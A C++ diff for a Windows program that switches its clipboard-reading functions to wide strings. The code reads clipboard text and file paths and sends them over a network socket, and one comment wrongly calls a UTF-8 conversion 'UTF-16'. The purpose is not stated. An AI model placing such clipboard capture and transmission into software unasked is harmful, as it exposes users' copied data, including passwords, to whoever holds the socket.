@@ -5,19 +5,9 @@
 #include <Lmcons.h>
 #include <windows.h>
 
-// Function to convert UTF-16 to UTF-8 using WinAPI
-std::string WideToUtf8(const std::wstring& wide) {
-    if (wide.empty()) return std::string();
-    
-    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), (int)wide.size(), NULL, 0, NULL, NULL);
-    std::string utf8(size_needed, 0);
-    WideCharToMultiByte(CP_UTF8, 0, wide.c_str(), (int)wide.size(), &utf8[0], size_needed, NULL, NULL);
-    return utf8;
-}
-
 // Function to get file information from clipboard
-std::string ProcessFileClipboard() {
-    std::string result;
+std::wstring ProcessFileClipboard() {
+    std::wstring result;
     HDROP hDrop = (HDROP)GetClipboardData(CF_HDROP);
     if (hDrop != NULL) {
         UINT fileCount = DragQueryFile(hDrop, 0xFFFFFFFF, NULL, 0);
@@ -26,15 +16,13 @@ std::string ProcessFileClipboard() {
             TCHAR szFile[MAX_PATH];
             if (DragQueryFile(hDrop, i, szFile, MAX_PATH)) {
                 std::wstring widePath(szFile);
-                std::string utf8Path = WideToUtf8(widePath);
-                result += "File: " + utf8Path + "\n";
+                result += L"File: " + widePath + L"\n";
                 
                 // Get file extension
                 size_t dotPos = widePath.find_last_of(L".");
                 if (dotPos != std::wstring::npos) {
                     std::wstring wideExt = widePath.substr(dotPos + 1);
-                    std::string utf8Ext = WideToUtf8(wideExt);
-                    result += "Type: " + utf8Ext + "\n";
+                    result += L"Type: " + wideExt + L"\n";
                 }
             }
         }
@@ -43,15 +31,13 @@ std::string ProcessFileClipboard() {
 }
 
 // Function to get text from clipboard
-std::string ProcessTextClipboard() {
-    std::string result;
+std::wstring ProcessTextClipboard() {
+    std::wstring result;
     HANDLE hData = GetClipboardData(CF_UNICODETEXT);
     if (hData != NULL) {
         wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
         if (pszText != NULL) {
-            std::wstring wideText(pszText);
-            std::string utf8Text = WideToUtf8(wideText);
-            result = "Text content: " + utf8Text;
+            result = L"Text content: " + std::wstring(pszText);
             GlobalUnlock(hData);
         }
     }
@@ -72,20 +58,24 @@ void MonitorClipboard(SOCKET sock) {
             if (OpenClipboard(NULL)) {
                 Message msg = {};
                 msg.type = MessageType::REGULAR;
-                std::string clipboardContent;
+                std::wstring clipboardContent;
                 
                 // Check for files
                 if (IsClipboardFormatAvailable(CF_HDROP)) {
-                    clipboardContent = "Files detected in clipboard:\n" + ProcessFileClipboard();
+                    clipboardContent = L"Files detected in clipboard:\n" + ProcessFileClipboard();
                 }
                 // Check for text
                 else if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
-                    clipboardContent = "Text detected in clipboard:\n" + ProcessTextClipboard();
+                    clipboardContent = L"Text detected in clipboard:\n" + ProcessTextClipboard();
                 }
                 
                 if (!clipboardContent.empty()) {
-                    strncpy_s(msg.data, clipboardContent.c_str(), BUFFER_SIZE - 1);
-                    send(sock, (char*)&msg, sizeof(Message), 0);
+                    // Convert wide string to UTF-16 bytes
+                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, clipboardContent.c_str(), -1, NULL, 0, NULL, NULL);
+                    if (size_needed > 0 && size_needed < BUFFER_SIZE) {
+                        WideCharToMultiByte(CP_UTF8, 0, clipboardContent.c_str(), -1, msg.data, BUFFER_SIZE, NULL, NULL);
+                        send(sock, (char*)&msg, sizeof(Message), 0);
+                    }
                 }
                 
                 CloseClipboard();
